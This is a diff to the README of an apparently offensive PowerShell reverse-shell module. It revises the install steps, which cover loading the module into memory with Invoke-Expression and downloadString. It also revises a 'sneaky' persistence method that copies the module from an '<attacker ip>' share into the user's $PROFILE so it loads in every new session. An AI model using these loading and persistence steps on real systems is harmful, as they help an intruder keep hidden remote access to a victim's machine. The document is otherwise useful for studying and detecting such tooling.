@@ -22,7 +22,7 @@ Find-ReverseShell.ps1 can be used to search the Windows Event Log for when a Rev
 
 #### WAYS TO INSTALL OR IMPORT THE MODULE
 This is not a requirement. It just a way of saving the module to your device if you wish to keep it around for use at later times.<br>
-Install this module by placing the cloned folder "__ReversePowerShell__" inside the following directory location.<br>
+Install this module by placing the cloned folder "__ReversePowerShell__" inside the following directory location. You can view all available Module install directories by issung the command ```$env:PSModulePath```<br>
  __"$env:USERPROFILE\\WindowsPowerShell\\Modules\\ReversePowerShell"__ <br>
  For PowerShell Core v6 the location of this module will need to be<br>
  __"$env:USERPROFILE\\WindowsPowerShell\\ReversePowerShell"__<br>
@@ -36,7 +36,7 @@ Or in cases where you want to import the module from whatever file you are in...
 Import-Module .\ReversePowerShell.psm1
 ```
 
-If your are able to use Invoke-Expresion (IEX) this module can be imported using the following command.
+If your are able to use Invoke-Expresion (IEX), this module (ReversePowerShell) can be imported using the following command.
 You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run.
 Notice the .ps1 extension. When using downloadString this will need to be a ps1 file to inject the module into
 memory in order to run the cmdlets.
@@ -56,18 +56,17 @@ This will execute the file and it's contents on the remote computer.
 Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the $PROFILE file.
 ```powershell
 Write-Verbose "Creates powershell profile for user"
-New-Item -Path $PROFILE -ItemType File -Force
+If (!(Test-Path -Path $PROFILE)) { New-Item -Path $PROFILE -ItemType File -Force }
 #
 # The $PROFILE VARIABLE IS EITHER GOING TO BE
 #    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
 # OR
 #    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
 #
-# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands every time the executing user opens a PowerShell session. This means you will need to open a new PowerShell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
+> Adding this module into the PowerShell $PROFILE will import all of the commands every time the executing user opens a PowerShell session. This means you will need to open a new PowerShell session after doing this in order to access the commands. Just like using ```source .bashrc``` to apply changes to the ~/.bashrc file in a linux terminal you can reload the profile by doing the following.
+```powershell
 cmd /c 'copy \\<attacker ip>\MyShare\ReversePowerShell.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1
-
-powershell.exe
-# If that does not work try reloading the user profile.
+powershell.exe # Maybe but not sure on this one
 & $PROFILE
 ```
 
